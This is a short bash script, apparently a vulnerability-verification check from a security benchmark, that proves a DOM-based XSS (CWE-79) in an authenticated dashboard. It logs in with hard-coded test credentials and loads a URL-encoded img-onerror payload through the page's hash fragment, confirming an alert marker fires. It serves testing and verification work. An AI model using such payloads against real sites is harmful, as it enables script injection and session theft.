#!/usr/bin/env bash
# DOMXSS-001 (CWE-79): the dashboard reads location.hash and writes it into the
# page with innerHTML. The payload is in the fragment, never sent to the server,
# and the dashboard is authenticated - so only a logged-in real browser sees it.
set -eu; . "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
M="DOMXSS-PROVEN-7f3a"
P="%3Cimg%20src%3Dx%20onerror%3Dalert('$M')%3E"
# the fragment is absent from the server response
curl -s -b "$JAR" "$TARGET/dashboard" | grep -q "$M" && exit 1
browser_dialog "$TARGET/dashboard#$P" "$M" $(cookie_args)
